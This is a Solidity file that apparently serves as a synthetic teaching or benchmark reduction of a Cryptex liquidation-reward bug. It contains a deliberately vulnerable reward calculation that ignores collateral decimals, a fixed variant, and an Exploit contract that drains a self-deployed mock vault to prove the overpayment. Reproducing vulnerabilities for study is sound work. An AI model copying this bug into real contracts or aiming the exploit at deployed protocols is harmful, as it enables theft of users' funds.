// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Cryptex — liquidationReward ignores collateral decimals (Cantina, Sep 2024)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: LiquidationLib.liquidationReward prices a TCAP burn into collateral
    units without scaling by collateral decimals, so a 6-decimal token is paid
    as an 18-decimal amount. Vulnerable line preserved verbatim (@> VULN). */

contract MockToken {
    string public name;
    uint8 public decimals;
    mapping(address => uint256) public balanceOf;

    constructor(string memory n, uint8 d) {
        name = n;
        decimals = d;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount; // S5
        balanceOf[to] += amount;
        return true;
    }
}

contract LiquidationLib {
    function liquidationReward(uint256 burnAmount, uint256 tcapPrice, uint256 collateralPrice, uint64 liquidationPenalty)
        public
        pure
        returns (uint256)
    {
        return burnAmount * tcapPrice * (1e18 + liquidationPenalty) / collateralPrice / 1e18; // @> VULN: S3 no collateral decimals
    }
}

contract CollateralVault {
    MockToken public token;
    LiquidationLib public lib;

    constructor(MockToken t, LiquidationLib l) {
        token = t;
        lib = l;
    }

    function liquidate(uint256 burnAmount, uint256 tcapPrice, uint256 collateralPrice, uint64 penalty)
        external
        returns (uint256 reward)
    {
        reward = lib.liquidationReward(burnAmount, tcapPrice, collateralPrice, penalty); // S2
        token.transfer(msg.sender, reward); // S4
    }
}

contract LiquidationLibFixed {
    function liquidationReward(
        uint256 burnAmount,
        uint256 tcapPrice,
        uint256 collateralPrice,
        uint64 liquidationPenalty,
        uint8 collateralDecimals
    ) public pure returns (uint256) {
        return burnAmount * tcapPrice * (1e18 + liquidationPenalty) * (10 ** collateralDecimals) / collateralPrice / 1e18
            / (10 ** 18);
    }
}

contract Exploit {
    MockToken public usdc; // CREATE nonce 1
    LiquidationLib public lib; // CREATE nonce 2
    CollateralVault public vault; // CREATE nonce 3

    uint256 public paid;
    uint256 public fair;

    constructor() {
        usdc = new MockToken("USDC", 6);
        lib = new LiquidationLib();
        vault = new CollateralVault(usdc, lib);
        // 1e18 raw units so the buggy 18-decimal-sized reward can be paid.
        usdc.mint(address(vault), 1e18);
    }

    function run() external {
        uint256 burnAmount = 1e18;
        uint256 tcapPrice = 1e18;
        uint256 collateralPrice = 1e18;
        uint64 penalty = 0;
        paid = vault.liquidate(burnAmount, tcapPrice, collateralPrice, penalty); // S1
        fair = burnAmount * tcapPrice * (1e18 + penalty) * (10 ** 6) / collateralPrice / 1e18 / (10 ** 18); // S6
        require(paid == 1e18, "buggy reward");
        require(fair == 1e6, "fair reward");
        require(paid > fair, "no overpay");
        require(usdc.balanceOf(address(this)) == paid, "liquidator paid");
        require(usdc.balanceOf(address(vault)) == 0, "vault drained of the seeded collateral");
    }
}
